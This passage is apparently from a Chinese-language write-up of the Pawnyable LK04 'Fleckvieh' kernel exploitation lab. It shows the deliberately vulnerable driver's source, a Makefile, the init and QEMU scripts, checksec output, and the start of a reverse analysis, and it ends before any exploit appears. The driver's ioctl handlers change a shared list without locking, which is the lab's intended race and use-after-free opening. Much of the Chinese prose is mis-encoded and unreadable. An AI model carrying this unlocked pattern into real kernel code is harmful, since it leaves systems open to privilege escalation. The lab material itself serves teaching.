punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  tmp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">list_for_each_entry_safe</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>itr<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>blob_list <span class="token operator">*</span><span class="token function">blob_find_by_id</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">;</span>  <span class="token comment">/* Find blob by id */</span>  <span class="token function">list_for_each_entry</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>id <span class="token operator">==</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> itr<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_add</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>new<span class="token punctuation">;</span>  <span class="token comment">/* Check size */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> <span class="token number">0x1000</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Allocate a new blob structure */</span>  new <span class="token operator">=</span> <span class="token punctuation">(</span>blob_list<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>blob_list<span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token comment">/* Allocate data buffer */</span>  new<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span>req<span class="token operator">-></span>size<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/* Copy data from user buffer */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  new<span class="token operator">-></span>size <span class="token operator">=</span> req<span class="token operator">-></span>size<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Generate a random positive integer */</span>  <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>    <span class="token function">get_random_bytes</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>id<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>new<span class="token operator">-></span>id <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Insert to list */</span>  <span class="token function">list_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>new<span class="token operator">-></span>list<span class="token punctuation">,</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> new<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_del</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Delete the item */</span>  <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>victim<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_get</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Check size */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Copy data to user */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token operator">-></span>data<span class="token punctuation">,</span> victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">blob_set</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">,</span> <span class="token class-name">request_t</span> <span class="token operator">*</span>req<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  blob_list <span class="token operator">*</span>victim<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">blob_find_by_id</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> req<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Check size */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token operator">-></span>size <span class="token operator">></span> victim<span class="token operator">-></span>size<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token comment">/* Copy data from user */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>victim<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>data<span class="token punctuation">,</span> req<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> req<span class="token operator">-></span>id<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_ADD<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_add</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_DEL<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_del</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_get</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">blob_set</span><span class="token punctuation">(</span>top<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>  <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>  <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> module_ioctl<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefileï¼š</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> fleckvieh.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/build<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸€ã€LK04-Userfaultfd"><a href="#ä¸€ã€LK04-Userfaultfd" class="headerlink" title="ä¸€ã€LK04 Userfaultfd"></a>ä¸€ã€LK04 Userfaultfd</h1><h2 id="ä¸€-é€†å‘åˆ†æ"><a href="#ä¸€-é€†å‘åˆ†æ" class="headerlink" title="(ä¸€)é€†å‘åˆ†æ"></a>(ä¸€)é€†å‘åˆ†æ</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict<span class="token function">chmod</span> <span class="token number">666</span> /dev/fuse<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/vm/unprivileged_userfaultfdinsmod /root/fleckvieh.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/fleckvieh c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> fleckvieh /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Fleckvieh (LK04) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯<code>echo 1 &gt; /proc/sys/vm/unprivileged_userfaultfd</code>ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œuserfaultfdç³»ç»Ÿè°ƒç”¨</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smap,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fleckvieh-ko"><a href="#fleckvieh-ko" class="headerlink" title="fleckvieh.ko"></a>fleckvieh.ko</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">54</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./fleckvieh.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token function">INIT_LIST_HEAD</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>likelyå’Œunlikelyå®ï¼š<br><code>#define likely(x)      __builtin_expect(!!(x), 1)</code><br><code>#define unlikely(x)    __builtin_expect(!!(x), 0)</code><br>å®ƒä»¬çš„ä½œç”¨æ˜¯ä¼˜åŒ–ä»£ç çš„æ‰§è¡Œï¼Œç®€è€Œè¨€ä¹‹ï¼Œlikelyä»£è¡¨ifåˆ†æ”¯å¤§æ¦‚ç‡ä¼šå‘ç”Ÿï¼Œunlikelyä»£è¡¨ifåˆ†æ”¯å¤§æ¦‚ç‡ä¸ä¼šå‘ç”Ÿ</p></blockquote><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>  blob_list <span class="token operator">*</span>itr<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>  top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token operator">*</span><span class="token punctuation">)</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">;</span>  tmp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">list_for_each_entry_safe</span><span class="token punctuation">(</span>itr<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> top<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>itr<span class="token operator">-></span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>itr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>top<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*typedef struct &#123;  int id;  size_t size;  char *data;  struct list_head list;&#125; blob_list;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…³é—­è®¾å¤‡æ—¶ï¼Œéå†é“¾è¡¨åˆ 